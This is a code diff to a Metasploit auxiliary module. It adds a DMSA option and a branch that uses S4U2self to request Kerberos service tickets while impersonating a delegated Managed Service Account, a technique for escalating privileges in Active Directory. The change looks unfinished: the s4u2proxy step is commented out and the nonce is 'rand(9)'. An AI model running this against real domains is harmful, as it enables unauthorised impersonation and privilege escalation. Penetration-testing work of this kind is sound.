@@ -50,9 +50,10 @@ class MetasploitModule < Msf::Auxiliary
         OptString.new('PASSWORD', [ false, 'The domain user\'s password' ]),
         OptPath.new('CERT_FILE', [ false, 'The PKCS12 (.pfx) certificate file to authenticate with' ]),
         OptString.new('CERT_PASSWORD', [ false, 'The certificate file\'s password' ]),
+        OptBool.new('DMSA', [ false, 'Set to true if the account you are impersonating is a dMSA account' ]),
         OptString.new(
           'NTHASH', [
-            false,
+            false, 
             'The NT hash in hex string. Server must support RC4'
           ]
         ),
@@ -90,6 +91,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def validate_options
+
     if datastore['CERT_FILE'].present?
       pkcs12_storage = Msf::Exploit::Remote::Pkcs12::Storage.new(framework: framework, framework_module: self)
       @pfx = pkcs12_storage.read_pkcs12_cert_path(datastore['CERT_FILE'], datastore['CERT_PASSWORD'], workspace: workspace)[:value]
@@ -204,7 +206,36 @@ class MetasploitModule < Msf::Auxiliary
     end
     credential = authenticator.request_tgt_only(tgt_request_options)
 
-    if datastore['IMPERSONATE'].present?
+    if datastore['IMPERSONATE'].present? && datastore['DMSA'] == true
+      print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
+
+      sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
+        name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+        name_string: [
+          "krbtgt",
+          @realm
+        ]
+      )
+
+      nonce = rand(9)
+      auth_options = {
+        sname: sname,
+        impersonate: datastore['IMPERSONATE'],
+        nonce: nonce,
+        dmsa: true
+      }
+      tgs_ticket, _tgs_auth = authenticator.s4u2self(
+        credential,
+        auth_options.merge(ticket_storage: kerberos_ticket_storage(read: false, write: true))
+      )
+
+      # auth_options[:sname] = Rex::Proto::Kerberos::Model::PrincipalName.new(
+      #   name_type: Rex::Proto::Kerberos::Model::NameType::NT_SRV_INST,
+      #   name_string: datastore['SPN'].split('/')
+      # )
+      auth_options[:tgs_ticket] = tgs_ticket
+      # authenticator.s4u2proxy(credential, auth_options)
+    elsif datastore['IMPERSONATE'].present?
       print_status("#{peer} - Getting TGS impersonating #{datastore['IMPERSONATE']}@#{@realm} (SPN: #{datastore['SPN']})")
 
       sname = Rex::Proto::Kerberos::Model::PrincipalName.new(
